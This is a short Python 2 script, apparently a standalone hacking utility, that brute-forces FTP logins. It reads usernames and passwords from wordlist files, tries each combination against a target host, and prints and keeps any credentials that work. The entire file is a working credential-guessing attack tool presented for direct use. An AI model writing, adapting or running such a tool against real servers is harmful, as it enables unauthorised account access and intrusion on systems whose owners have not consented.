#!/usr/bin/python2
#enable debugging

import os, sys, threading
from ftplib import FTP
from libs import kpstd

progname = os.path.split(sys.argv[0])[1]
progvers = 'kpftp-1.0'
prognver = '1.0'

ftp_host = ''   # default
ftp_port = 21   # default
ftp_uinp = []   # list of file(s) contain(s) usernames
ftp_pinp = []   # list of file(s) contain(s) passwords

br_count = 0
br_total = 0    # will change in runtime (= total line of file(s))
br_found = []
def bruteforce(host, username, password):
    global br_count, br_found
    try:
        ftp = FTP(host)
        ftp.login(username, password)
        ftp.retrlines('LIST')
        kpstd.norm("Bruteforce successfully.")
        kpstd.norm("FTP Username: %s" %username)
        kpstd.norm("FTP Password: %s" %password)
        br_found.append(username)
        br_found.append(password)
        return True
    except:
        br_count += 1
    return False

def usage(intro=False):
    print("%s %s copyright (c) 2016 by Nick Lauri" %(progname, prognver))
    print("%s - Bruteforce the FTP password" %(progname.split('.')[0]))
    if intro:
       return
    print("Usage: %s host usrname_files passwd_files" %(sys.argv[0]))
    print("Note:")
    print("    - Default port: 21")
    print("    - Files separated by ';'")


def parse_args():
    global ftp_host, ftp_uinp, ftp_pinp
    if len(sys.argv) != 4:
        usage()
        exit(1)
    
    usage(intro=True)
    ftp_host = sys.argv[1]
    # port set default
    ftp_uinp = sys.argv[2].split(';')
    ftp_pinp = sys.argv[3].split(';')
    
    uinp_tmp = []
    pinp_tmp = []
    for ui in ftp_uinp:
        if not os.path.isfile(ui):
            kpstd.error('Invalid file path: `%s`' %ui)
            exit(1)
        else:
            uinp_tmp.append(ui)
    for pi in ftp_pinp:
        if not os.path.isfile(pi):
            kpstd.error('Invalid file path: `%s`' %pi)
            exit(1)
        else:
            pinp_tmp.append(pi)
    ftp_uinp = uinp_tmp
    ftp_pinp = pinp_tmp

def main():
    # th_max = 10
    # th_cur = len(threading.enumerate) - 1

    parse_args()
    kpstd.info('Target host: %s' %ftp_host)
    kpstd.info('Target port: %s' %ftp_port)
    kpstd.info('Number uinp: %d' %len(ftp_uinp))
    kpstd.info('Number pinp: %d' %len(ftp_pinp))
    for u in ftp_uinp:
        uf = open(u)
        for ul in uf.readlines():
            ul = ul.strip('\n').strip('\r')
            kpstd.norm('Trying username `%s`' %ul)
            for p in ftp_pinp:
                pf = open(p)
                for pl in pf.readlines():
                    pl = pl.strip('\n')
                    kpstd.norm('\t- password: `%s`' %pl)
                    if bruteforce(ftp_host, ul, pl):
                        return 0
    return 1

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        kpstd.erro('Terminated signal received.')
        exit(1)
    else:
        kpstd.info('Exiting.')
        exit(0)

